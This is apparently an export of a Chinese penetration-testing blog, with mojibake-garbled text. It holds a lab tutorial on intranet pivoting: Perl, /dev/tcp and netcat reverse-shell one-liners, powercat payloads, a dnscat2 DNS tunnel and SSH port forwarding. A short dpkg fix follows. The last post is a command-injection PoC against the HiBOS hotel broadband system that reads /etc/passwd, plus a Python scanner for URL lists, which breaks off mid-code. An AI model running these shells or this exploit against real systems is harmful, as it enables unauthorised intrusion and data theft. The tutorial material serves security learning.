<p>ç›®æ ‡æœºï¼š<code>perl -e &#39;use Socket;$i=&quot;192.168.0.128&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></p>
<h6 id="å†…ç½‘ä»£ç†å¼¹shell"><a href="#å†…ç½‘ä»£ç†å¼¹shell" class="headerlink" title="å†…ç½‘ä»£ç†å¼¹shell"></a>å†…ç½‘ä»£ç†å¼¹shell</h6><p><img src="/posts/11ff0b53/neiwangdaili_shell.jpg"></p>
<p>kaliæ‰§è¡Œ:<code>nc -lvp 3333</code><br>æ•°æ®åº“æ‰§è¡Œ:<code>nc -lvp 3333 -e /bin/sh</code><br>webæœåŠ¡å™¨æ‰§è¡Œï¼š<code>nc -v 192.168.1.4 3333 -c &quot;nc -v 1.1.1.200 3333&quot;</code></p>
<p>åŸç†ï¼šwebæœåŠ¡å™¨å½“ä½œä¸­é—´æœºï¼Œè¿æ¥kaliå’Œæ•°æ®åº“çš„3333ç«¯å£ï¼Œä½¿kaliä¸æ•°æ®åº“é€šä¿¡</p>
<h6 id="execåå¼¹shell"><a href="#execåå¼¹shell" class="headerlink" title="execåå¼¹shell"></a>execåå¼¹shell</h6><p>æ”»å‡»æœºï¼š<code>nc -lvp 8888</code></p>
<p>ç›®æ ‡æœºï¼š<code>0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/192.168.0.128/8888; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></p>
<p><img src="/posts/11ff0b53/nc_shell5.png"></p>
<p>å¯ä»¥åˆ©ç”¨python2 å˜ä¸ºäº¤äº’å¼çš„shell <code>python2 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
<p>æˆ–<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
<hr>
<h5 id="powercatä½¿ç”¨"><a href="#powercatä½¿ç”¨" class="headerlink" title="powercatä½¿ç”¨"></a>powercatä½¿ç”¨</h5><p>powercatå¯ä»¥ç†è§£æˆpowershellç‰ˆçš„natcat,</p>
<p>ä¸‹è½½åœ°å€ï¼š <a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p>
<p>ä¸‹è½½ä¸‹æ¥çš„powercat.ps1æ–‡ä»¶ è¿›è¡Œå¯¼å…¥<code> Import-Module .\powercat.ps1</code></p>
<p>å¦‚æœæƒé™ä¸è¶³ ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€powershell<code>Set-ExecutionPolicy Unrestricted</code>è¾“å…¥Y</p>
<p><code>Get-ExecutionPolicy</code>æŸ¥çœ‹å½“å‰psæƒé™</p>
<p> <code>powercat -h</code>æµ‹è¯•æ˜¯å¦å¯¼å…¥æˆåŠŸ</p>
<p><img src="/posts/11ff0b53/powercat1.png"></p>
<p>åœ¨win10ä¸­æ›´æ”¹poweshellæƒé™ <code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe </code>ä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œï¼Œåœ¨æœ¬æœºè¿›è¡Œå°è¯•æ—¶ï¼Œæ¯æ¬¡å¯¼å…¥æ¨¡å—åç³»ç»Ÿéƒ½ä¼šå°†powercat.ps1åˆ é™¤æ‰â€¦</p>
<blockquote>
<p>#powercat  å‘½ä»¤å‚æ•°</p>
<p>-l ç›‘å¬æ¨¡å¼</p>
<p>-p æŒ‡å®šç›‘å¬ç«¯å£</p>
<p>-e æŒ‡å®šå¯åŠ¨è¿›ç¨‹çš„åç§°</p>
<p>-v æ˜¾ç¤ºè¯¦æƒ…</p>
<p>-c æŒ‡å®šæƒ³è¦è¿æ¥çš„ IP åœ°å€</p>
<p>-ep è¿”å› powershell -dns ä½¿ç”¨ dns é€šä¿¡</p>
<p>-g ç”Ÿæˆ payload -ge ç”Ÿæˆç»è¿‡ç¼–ç çš„ payloadï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ powershell </p>
<p>-e æ‰§è¡Œè¯¥ payload</p>
</blockquote>
<h6 id="é€šè¿‡ncæ­£å‘è¿æ¥powercat"><a href="#é€šè¿‡ncæ­£å‘è¿æ¥powercat" class="headerlink" title="é€šè¿‡ncæ­£å‘è¿æ¥powercat"></a>é€šè¿‡ncæ­£å‘è¿æ¥powercat</h6><p>win7ï¼š<code>powercat -l -p 8888 -e cmd.exe -v</code></p>
<p>kaliï¼š<code>nc 192.168.0.129 8888</code></p>
<p><img src="/posts/11ff0b53/powercat_shell1.png"></p>
<h6 id="é€šè¿‡ncåå‘è¿æ¥powercat"><a href="#é€šè¿‡ncåå‘è¿æ¥powercat" class="headerlink" title="é€šè¿‡ncåå‘è¿æ¥powercat"></a>é€šè¿‡ncåå‘è¿æ¥powercat</h6><p>kaliï¼š<code>nc -l -p 8888 -v </code></p>
<p>win7ï¼š<code>powercat -c 192.168.0.128 -p 8888 -v -e cmd.exe</code></p>
<h6 id="è¿”å›powershell"><a href="#è¿”å›powershell" class="headerlink" title="è¿”å›powershell"></a>è¿”å›powershell</h6><p>win7ï¼š<code>powercat -l -v -p 8888</code></p>
<p>win2008ï¼š<code>powercat -c 192.168.0.129 -p 8888 -v -ep</code></p>
<p><img src="/posts/11ff0b53/powercat_shell3.png"></p>
<h6 id="powercat-ç”Ÿæˆpaylaod"><a href="#powercat-ç”Ÿæˆpaylaod" class="headerlink" title="powercat ç”Ÿæˆpaylaod"></a>powercat ç”Ÿæˆpaylaod</h6><p>win7ï¼š <code>Powercat -l -p 8888 -e cmd -v -g &gt;&gt;shell.ps1</code> å°†shell.ps1ä¼ åˆ°win2008å¹¶æ‰§è¡Œ</p>
<p>win7ï¼š<code>powercat -c 192.168.0.132 -p 8888 -v</code></p>
<p>è¿™é‡Œè¯•äº†å¥½å‡ æ¬¡éƒ½æ²¡æˆåŠŸâ€¦â€¦.</p>
<p>ä¸æƒ³ç”Ÿæˆæ–‡ä»¶çš„è¯ä»¬å¯ä»¥ä½¿ç”¨ -ge ç”Ÿæˆç¼–ç åçš„payload</p>
<p>win7ï¼š<code>powercat -c 192.168.0.129 -p 8888 -ep -ge</code></p>
<h6 id="åˆ›å»ºdnséš§é“è¿æ¥"><a href="#åˆ›å»ºdnséš§é“è¿æ¥" class="headerlink" title="åˆ›å»ºdnséš§é“è¿æ¥"></a>åˆ›å»ºdnséš§é“è¿æ¥</h6><p>åœ¨kaliä¸Šå®‰è£…discat</p>
<blockquote>
<p>git clone <a href="https://github.com/iagox86/dnscat2.git">https://github.com/iagox86/dnscat2.git</a><br>cd dnscat2/server/<br>gem install bundler<br>bundle install</p>
</blockquote>
<p>åŒæ—¶å®‰è£…rubyç¯å¢ƒ</p>
<p>å¼€å¯æœåŠ¡ç«¯ <code>ruby dnscat2.rb powercat -e open --no-cache</code></p>
<p>åœ¨win7ç›®æ ‡æœºæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ å»ºç«‹dnséš§é“</p>
<p><code>powercat -c 192.168.0.128 -p 53 -dns powercat -e cmd.exe</code> è¿™é‡Œipä¸ºkali ip</p>
<p><img src="/posts/11ff0b53/powercat_win7.PNG"></p>
<p>åœ¨win7æ‰§è¡Œå®Œå‘½ä»¤åä¼šè·å¾—ä¸€ä¸ªsession</p>
<p><img src="/posts/11ff0b53/powercat_dns_shell.PNG"></p>
<p><code>session -i 1</code></p>
<p><img src="/posts/11ff0b53/powercat_dns_shell2.PNG"></p>
<p>ä½†æ˜¯ä½¿ç”¨è¯¥éš§é“åœ¨æ‰§è¡Œå‘½ä»¤æ—¶ä¼šæœ‰äº›å¡ï¼Œä¸å»ºè®®ä½¿ç”¨</p>
<h6 id="powercatä½œä¸ºè·³æ¿è¿›è¡Œè½¬å‘"><a href="#powercatä½œä¸ºè·³æ¿è¿›è¡Œè½¬å‘" class="headerlink" title="powercatä½œä¸ºè·³æ¿è¿›è¡Œè½¬å‘"></a>powercatä½œä¸ºè·³æ¿è¿›è¡Œè½¬å‘</h6><p>kaliï¼š192.168.0.128</p>
<p>win7ï¼š192.168.0.129</p>
<p>win2008ï¼š192.168.0.132</p>
<p>win7åšè·³æ¿ï¼Œè®©kalié€šè¿‡win7è¿æ¥win2008</p>
<p>win2008  <code>powercat -l -v -p 4444 -e cmd.exe</code></p>
<p>win7 <code>powercat -l -v -p 5555 -r tcp:192.168.0.132:4444</code></p>
<p>kali <code>nc  192.168.0.129 5555 -vv</code></p>
<hr>
<h3 id="SSHéš§é“"><a href="#SSHéš§é“" class="headerlink" title="SSHéš§é“"></a>SSHéš§é“</h3><h4 id="SSHåŠŸèƒ½ï¼š"><a href="#SSHåŠŸèƒ½ï¼š" class="headerlink" title="SSHåŠŸèƒ½ï¼š"></a>SSHåŠŸèƒ½ï¼š</h4><p> 1.<strong>åŠ å¯†</strong>SSH Client ç«¯å€¼ SSH Server ç«¯ä¹‹é—´çš„é€šè®¯æ•°æ®</p>
<p>2.<strong>çªç ´é˜²æŠ¤å¢™çš„é™åˆ¶</strong>å®Œæˆä¸€äº›æ— æ³•å»ºç«‹çš„TCPè¿æ¥</p>
<h4 id="å¸¸è§„æ“ä½œ"><a href="#å¸¸è§„æ“ä½œ" class="headerlink" title="å¸¸è§„æ“ä½œ"></a>å¸¸è§„æ“ä½œ</h4><p><code>ssh root@192.168.0.129 -P 22</code></p>
<p>æœ¬è´¨ä¸ºç«¯å£è½¬å‘</p>
<blockquote>
<p>ç¯å¢ƒé…ç½®<br>win7    192.168.0.129(NAT)  10.10.0.130(ä»…ä¸»æœº)<br>kali        192.168.0.128(NAT)<br>ubuntu 192.168.0.130(NAT)<br>win2008  10.10.0.131(ä»…ä¸»æœº)</p>
</blockquote>
<h4 id="å¯†ç ç™»å½•äºä¸­é—´äººæ”»å‡»"><a href="#å¯†ç ç™»å½•äºä¸­é—´äººæ”»å‡»" class="headerlink" title="å¯†ç ç™»å½•äºä¸­é—´äººæ”»å‡»"></a>å¯†ç ç™»å½•äºä¸­é—´äººæ”»å‡»</h4><p>1..è¿œç¨‹ä¸»æœºæ”¶åˆ°ç”¨æˆ·ç™»å½•è¯·æ±‚ï¼Œå§è‡ªå·±çš„å…¬é’¥å‘ç»™ç”¨æˆ·</p>
<p>2.ç”¨æˆ·ä½¿ç”¨è¯¥å…¬é’¥ï¼Œå°†å¯†ç åŠ å¯†åï¼Œå‘ç»™è¿œç¨‹ä¸»æœº</p>
<p>3.è¿œç¨‹ä¸»æœºç”¨è‡ªå·±çš„ç§é’¥ï¼Œè§£å¯†ç™»å½•å¯†ç ï¼Œå¦‚æœå¯†ç æ­£ç¡®ï¼Œç”¨æˆ·å°±èƒ½ç™»å½•</p>
<blockquote>
<p>æœåŠ¡å™¨  ==========&gt; ç”¨æˆ· =====================&gt; æœåŠ¡å™¨  </p>
<p>â€”â€”â€”â€”å‘é€å…¬é’¥â€”â€”â€”â€“åˆ©ç”¨å…¬é’¥åŠ å¯†ç§é’¥å¹¶å‘é€â€”-å¯†ç éªŒè¯ï¼ˆY/Nï¼‰</p>
</blockquote>
<br>

<p>SSHéš§é“åŸç†</p>
<ul>
<li>æœ¬åœ°ç«¯å£è½¬å‘</li>
</ul>
<blockquote>
<p>client/kali â€”â€”â€”â€”â€” è·³è½¬æœº ubnutu â€”â€”â€”â€”â€”-server/win2008</p>
<p>192.168.0.128â€”â€”â€”â€“jump/192.168.0.129â€”â€”â€”â€”10.10.0.135</p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“10.10.0.137â€”â€”â€”â€”â€”â€”â€”</p>
</blockquote>
<p><code>ssh -L æœ¬åœ°ç«¯å£:ç›®æ ‡ä¸»æœº:ç›®æ ‡ç«¯å£  jumpä¸»æœºhost</code></p>
<p><code>ssh -L 2121:10.10.0.2:21 root@192.168.0.129</code></p>
<blockquote>
<p>å»ºç«‹SSHéš§é“å¸¸ç”¨å‚æ•°<br>-C å‹ç¼©ä¼ è¾“ï¼Œæé«˜ä¼ è¾“é€Ÿåº¦ã€‚<br> -f å°† SSH ä¼ è¾“è½¬å…¥åå°æ‰§è¡Œï¼Œä¸å ç”¨å½“å‰ shell<br>-N å»ºç«‹é™é»˜è¿æ¥ï¼ˆå»ºç«‹äº†è¿æ¥ä½†çœ‹ä¸åˆ°å…·ä½“ä¼šè¯ï¼‰<br> -g å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£ã€‚<br> -L æœ¬åœ°ç«¯å£è½¬å‘<br> -R è¿œç¨‹ç«¯å£è½¬å‘<br> -D åŠ¨æ€è½¬å‘ï¼ˆ SOCKS ä»£ç†ï¼‰<br> -p æŒ‡å®š SSH ç«¯å£</p>
</blockquote>
<ul>
<li>è¿œç¨‹ç«¯å£è½¬å‘</li>
</ul>
<blockquote>
<p>client/ kaliâ€”â€”â€”â€”â€”â€“jump/ubuntuâ€”â€”â€”â€”â€”â€”-server/win2008</p>
<p>192.168.0.128â€”â€”â€”â€”â€“10.10.0.129    â€”â€”â€”â€”â€”â€”â€”10.10.0.135</p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”æ²¡æœ‰å¤–ç½‘ipâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p>
<p>â€”â€”â€”â€”â€”â€”â€”â€”â€”-ä½†æ˜¯å¯ä»¥è¿æ¥å¤–ç½‘â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p>
</blockquote>
<p>è·³è½¬æœºä¸ºçº¯å†…ç½‘ç¯å¢ƒï¼Œä½†æ˜¯å¯ä»¥è®¿é—®å¤–ç½‘</p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œè·³è½¬æœºå¯ä»¥è®¿é—®kaliï¼Œkaliæ— æ³•è®¿é—®è·³è½¬æœºï¼Œåœ¨è·³è½¬æœºä¸Šå»ºç«‹ä¸€ä¸ªä¸kaliçš„è¿æ¥ï¼Œç„¶åå†kaliä¸Šä½¿ç”¨è¿™ä¸ªè¿æ¥  ç„¶åå°†æ‰€æœ‰æ•°æ®é€šè¿‡è·³è½¬æœºè½¬å‘ç»™ç›®æ ‡ä¸»æœºçš„ç›®æ ‡ç«¯å£  (åœ¨è¿™é‡Œè¿œç¨‹ä¸»æœºä¸ºkali)</p>
<p><code>ssh -R è¿œç¨‹ä¸»æœºç«¯å£:ç›®æ ‡ä¸»æœºï¼šç›®æ ‡ä¸»æœºç«¯å£ è·³è½¬æœº</code></p>
<p><code>ssh -R 2121:10.10.0.135:21  10.10.0.129</code></p>
<blockquote>
<p>å»ºç«‹SSHéš§é“å¸¸ç”¨å‚æ•°<br>-C å‹ç¼©ä¼ è¾“ï¼Œæé«˜ä¼ è¾“é€Ÿåº¦ã€‚<br> -f å°† SSH ä¼ è¾“è½¬å…¥åå°æ‰§è¡Œï¼Œä¸å ç”¨å½“å‰ shell<br>-N å»ºç«‹é™é»˜è¿æ¥ï¼ˆå»ºç«‹äº†è¿æ¥ä½†çœ‹ä¸åˆ°å…·ä½“ä¼šè¯ï¼‰<br> -g å…è®¸è¿œç¨‹ä¸»æœºè¿æ¥æœ¬åœ°ç”¨äºè½¬å‘çš„ç«¯å£ã€‚<br> -L æœ¬åœ°ç«¯å£è½¬å‘<br> -R è¿œç¨‹ç«¯å£è½¬å‘<br> -D åŠ¨æ€è½¬å‘ï¼ˆ SOCKS ä»£ç†ï¼‰<br> -p æŒ‡å®š SSH ç«¯å£</p>
</blockquote>
<ul>
<li>åŠ¨æ€è½¬å‘</li>
</ul>
<p>å»ºç«‹ä¸€ä¸ª socks è¿æ¥ï¼Œä»»ä½•æ”¯æŒ socks 4/5 åè®®çš„ç¨‹åºéƒ½å¯ä»¥ä½¿ç”¨è¿™ä¸ªåŠ å¯†é€šé“è¿›è¡Œè®¿é—®</p>
<p>å¯ä»¥å‚è€ƒæ¢¯ å­ </p>
<p><code>ssh -D 8080 user@host</code></p>
<blockquote>
<p>å¤–ç½‘å»è®¿é—®å†…ç½‘ä¸­çš„äºŒçº§æœåŠ¡å™¨</p>
<p>å¤–ç½‘  â€”â€”â€”â€”â€”  ä¸€çº§æœåŠ¡å™¨ â€”â€”â€“é˜²ç«å¢™  â€”â€”â€“ äºŒçº§æœåŠ¡å™¨<br>â€”â€”â€“å¤–ç½‘    |  å†…ç½‘  â€”â€”â€” äºŒçº§æœåŠ¡å™¨åªèƒ½é€šè¿‡ä¸€çº§æœåŠ¡å™¨è®¿é—®</p>
<p>åœ¨ä¸€çº§æœåŠ¡å™¨ä¸Šé€šè¿‡æœ¬åœ°ç«¯å£è½¬å‘ï¼ŒæŠŠäºŒçº§æœåŠ¡å™¨ä¸Šçš„æµé‡å¯¼åˆ°ä¸€çº§æœåŠ¡å™¨ä¸Šã€‚è¿™æ ·å°±å¯ä»¥é€šè¿‡ä¸€çº§æœåŠ¡å™¨å»è®¿é—®äºŒçº§æœåŠ¡å™¨ã€‚ æ‰€ä»¥ äºŒçº§æœåŠ¡å™¨ä¸­çš„æœåŠ¡å™¨å¯ä»¥é€šè¿‡è¿œç¨‹ç«¯å£è½¬å‘çš„æ–¹æ³•ç›´æ¥æ˜ å°„åˆ°å¤–ç½‘çš„ä¸»æœºï¼Œå°†äºŒçº§å†…ç½‘çš„æµé‡ç›´æ¥å¯¼å…¥åˆ°å¤–ç½‘ä¸»æœºçš„ç«¯å£ï¼Œä»è€Œå®ç°ä»å¤–ç½‘å»è®¿é—®äºŒçº§ä¸»æœº</p>
</blockquote>
<br>

<h4 id="SSHéš§é“åˆ©ç”¨"><a href="#SSHéš§é“åˆ©ç”¨" class="headerlink" title="SSHéš§é“åˆ©ç”¨"></a>SSHéš§é“åˆ©ç”¨</h4><h5 id="æœ¬åœ°ç«¯å£è½¬å‘"><a href="#æœ¬åœ°ç«¯å£è½¬å‘" class="headerlink" title="æœ¬åœ°ç«¯å£è½¬å‘"></a>æœ¬åœ°ç«¯å£è½¬å‘</h5><h6 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h6><blockquote>
<p>kali 192.168.0.128ï¼ˆNATï¼‰<br>winserver2008  10.10.0.139ï¼ˆVM18 ä»…ä¸»æœºï¼‰<br>Ubuntu 192.168.0.130ï¼ˆNATï¼‰10.10.0.137ï¼ˆVM18 ä»…ä¸»æœºï¼‰</p>
</blockquote>
<br>

<blockquote>
<p>å¼€å¯ winServer2008 è¿œç¨‹è¿æ¥ <a href="https://www.cnblogs.com/Tanghongchang/p/7445786.html">https://www.cnblogs.com/Tanghongchang/p/7445786.html</a></p>
</blockquote>
<p>kaliæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå°†å†…ç½‘ä¸»æœºçš„3389ç«¯å£æ˜ å°„åˆ°è‡ªå·±çš„3389ç«¯å£</p>
<p><code>ssh -CfNg -L æ”»å‡»ä¸»æœºç«¯å£:å†…ç½‘åŠå…¬ä¸»æœºIP:å†…ç½‘åŠå…¬ä¸»æœºç«¯å£ WebæœåŠ¡å™¨sshç”¨æˆ·å@WebæœåŠ¡å™¨IP</code></p>
<p><code>ssh -CfNg -L 3333:10.10.0.139:3389 mamor@192.168.0.130 </code></p>
<p>é€šè¿‡æœåŠ¡å™¨ 192.168.0.139ä½œä¸ºè·³æ¿ å°†å†…ç½‘ä¸»æœºwinServer2008 çš„3389ç«¯å£è½¬å‘åˆ°kaliçš„3388ç«¯å£ï¼Œç„¶åè®¿é—®kaliçš„3333ç«¯å£å³å¯è®¿é—®åˆ°WinServer2008çš„3389ç«¯å£äº†</p>
<p>ä½¿ç”¨netstat è¿›è¡Œåˆ¤æ–­æ˜¯å¦å»ºç«‹ä»£ç†è½¬å‘</p>
<p><code>netstat -pantu | grep &quot;3333&quot;</code></p>
<p><img src="/posts/11ff0b53/ssh_bendi1.png"></p>
<p>ï¼ˆè¿æ¥è¢«é‡è®¾ï¼šæˆ‘å…ˆåœ¨winServer2008ä¸­æ‰“å¼€äº†è¿œç¨‹æœåŠ¡ ç„¶åç”¨Vm18ç½‘æ®µçš„æœºå™¨æµ‹è¯•å®Œ ä¹‹åå‘ç°winServer2008çš„ipå˜äº†ï¼Œç„¶åä¸€ç›´åœ¨æ‰¾åŸå›  ä¸ºä»€ä¹ˆè¿ä¸åŒäº†â€¦ç„¶åæ”¹ä¸‹sshå‘½ä»¤çš„winserver ipå°±å¥½äº†ï¼‰ </p>
<p>ç„¶åè¾“å…¥è´¦å·å¯†ç  å³å¯ç™»å½•åˆ°10.10.0.139 winServer2008æœåŠ¡å™¨ä¸­</p>
<p><img src="/posts/11ff0b53/ssh_bendi2.png"></p>
<h5 id="è¿œç¨‹ç«¯å£è½¬å‘"><a href="#è¿œç¨‹ç«¯å£è½¬å‘" class="headerlink" title="è¿œç¨‹ç«¯å£è½¬å‘"></a>è¿œç¨‹ç«¯å£è½¬å‘</h5><p>ç¯å¢ƒ</p>
<blockquote>
<p>kali 192.168.0.128(NATæ¨¡å¼)</p>
<p>Ubuntu 10.10.0.137(VM18 ä»…ä¸»æœº)</p>
<p>winServer2008 10.10.0.139 (VM18ä»…ä¸»æœº)0</p>
</blockquote>
<blockquote>
<p>åˆ é™¤Ubuntuçš„nat ç½‘å¡ï¼Œç°åœ¨ä»…æœ‰VM18ä¸€å—ç½‘å¡(10.10.0.0/24ç½‘æ®µçš„)</p>
<p>ä½†æ˜¯åœ¨è®¾ç½®ç½‘ç»œçš„æ—¶å€™æ²¡æ‰¾åˆ°ç›¸å…³çš„æ–‡å­—ï¼Œæ²¡æˆåŠŸè¿ä¸Šå¤–ç½‘ï¼Œä¹‹åæœ‰æ—¶é—´æ•´ä¸ªvpså¤ç°</p>
</blockquote>
<p><code>ssh -R è¿œç¨‹ä¸»æœºç«¯å£:ç›®æ ‡ä¸»æœºï¼šç›®æ ‡ä¸»æœºç«¯å£ è·³è½¬æœº</code></p>
<p>ä½¿ç”¨ -R åˆ›å»ºä¸€ä¸ªè¿œç¨‹è½¬å‘æ¨¡å¼çš„éš§é“</p>
<p><code>ssh -CfNg -R 3333:10.10.0.139:3389  mamor@192.168.0.130</code></p>
<p>ä½¿ç”¨<code>netstat</code>åˆ¤æ–­ä»£ç†è½¬å‘æ˜¯å¦æˆåŠŸå»ºç«‹</p>
<p><code>netstat  -ano | grep &quot;3333&quot; </code></p>
<p><code>rdesktop 127.0.0.1:3333</code></p>
<br>

<h5 id="åŠ¨æ€è½¬å‘"><a href="#åŠ¨æ€è½¬å‘" class="headerlink" title="åŠ¨æ€è½¬å‘"></a>åŠ¨æ€è½¬å‘</h5><h6 id="ç¯å¢ƒ-1"><a href="#ç¯å¢ƒ-1" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h6><blockquote>
<p>kali 192.168.0.128(NAT)</p>
<p>Ubuntu 192.168.0.130(NAT) 10.10.0.137(VM18 ä»…ä¸»æœº)</p>
<p>WinServer2008 10.10.0.139(VM18 ä»…ä¸»æœº)</p>
</blockquote>
<br>

<p><code>ssh -CfNg -D æ”»å‡»ä¸»æœºç«¯å£ WebæœåŠ¡å™¨sshç”¨æˆ·å@WebæœåŠ¡å™¨IP</code></p>
<p> <code>ssh -CfNg -D 8888  mamor@192.168.0.130</code></p>
<p>ç„¶åä½¿ç”¨proxychains4 ä»£ç†</p>
<p><code>sudo vim /etc/proxychains4.conf</code></p>
<p>æ·»åŠ <code>socks5 127.0.0.1 8888</code></p>
<p>ç„¶åä½¿ç”¨<code>proxychains4 firefox 10.10.0.139 </code>æˆåŠŸè®¿é—®åˆ°å†…ç½‘WinServer2008 çš„webé¡µé¢</p>
<p><img src="/posts/11ff0b53/ssh_dongtai1.png"></p>
<p><img src="/posts/11ff0b53/ssh_dongtai2.png"></p>
<p>ä½†æ˜¯ ä½¿ç”¨firefoxçš„ä»£ç†æ’ä»¶SwitchyOmega æ— æ³•è®¿é—®å†…ç½‘çš„webé¡µé¢</p>
<p>ä½¿ç”¨proxychains4 è®¿é—®WinServer2008çš„3389ç«¯å£</p>
<p><code>proxychains4 rdesktop 10.10.0.139:3389 </code></p>
<p><img src="/posts/11ff0b53/ssh_dongtai_rdesktop1.png"></p>
<p><img src="/posts/11ff0b53/ssh_dongtai_rdesktop2.png"></p>
<p>æˆåŠŸè®¿é—®3389ç«¯å£</p>
<br>

<hr>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://websec.readthedocs.io/zh/latest/intranet/index.html">https://websec.readthedocs.io/zh/latest/intranet/index.html</a></p>
<p><a href="https://c.wgpsec.org/p/10053">https://c.wgpsec.org/p/10053</a></p>
<p><a href="https://www.icode9.com/content-3-780098.html">https://www.icode9.com/content-3-780098.html</a></p>
<p><a href="https://yoga7xm.top/2019/03/27/IPentest-discover/">https://yoga7xm.top/2019/03/27/IPentest-discover/</a></p>
<p><a href="https://www.cnblogs.com/-chenxs/p/12378110.html">https://www.cnblogs.com/-chenxs/p/12378110.html</a></p>
<p><a href="https://soapffz.com/sec/21.html">https://soapffz.com/sec/21.html</a></p>
<p><a href="https://www.freebuf.com/sectool/243115.html">https://www.freebuf.com/sectool/243115.html</a></p>
<p><a href="https://teamssix.com/year/210601-155103.html">https://teamssix.com/year/210601-155103.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>E:dpkgè¢«ä¸­æ–­ï¼Œæ‚¨å¿…é¡»æ‰‹å·¥è¿è¡Œsudodpkg</title>
    <url>/posts/14f5ef78/</url>
    <content><![CDATA[<p>è§£å†³æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo rm /var/lib/dpkg/updates/*</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>HiBOSé…’åº—å®½å¸¦è¿è¥ç³»ç»ŸRCEæ¼æ´POC</title>
    <url>/posts/c20f4593/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload </span><br><span class="line">url + /manager/radius/server_ping.php?ip=127.0.0.1|cat /etc/passwd &gt;../../aaa.txt&amp;id=1</span><br><span class="line">è®¿é—® url + /aaa.txt</span><br><span class="line"></span><br><span class="line">å¦‚æœå­˜åœ¨ root:x:0:0:root:/root:/bin/bash</span><br><span class="line">è¯´æ˜æ¼æ´å­˜åœ¨</span><br></pre></td></tr></table></figure>

<p>v0.1å•çº¿ç¨‹ç‰ˆ åç»­å®Œå–„ ç”¨æ³•<br><code>python3 poc.py -u url</code><br><code>python3 poc.py -f url.txt</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*  HiBOSé…’åº—å®½å¸¦è¿è¥ç³»ç»ŸRCEæ¼æ´POCv0.1  *&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*                      Mamor        *&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;     -f ,--file urls.txt             &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">                url.replace(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;https://&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = <span class="string">&quot;https://&quot;</span> + url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]urlå½¢å¼ä¸ç¬¦åˆï¼ %s [*]&quot;</span> % url)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url</span>):</span><br><span class="line">    payload = <span class="string">&#x27;/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd%20&gt;../../aaa.txt&amp;id=1&#x27;</span></span><br><span class="line">    url1 = url + payload</span><br><span class="line">%<span 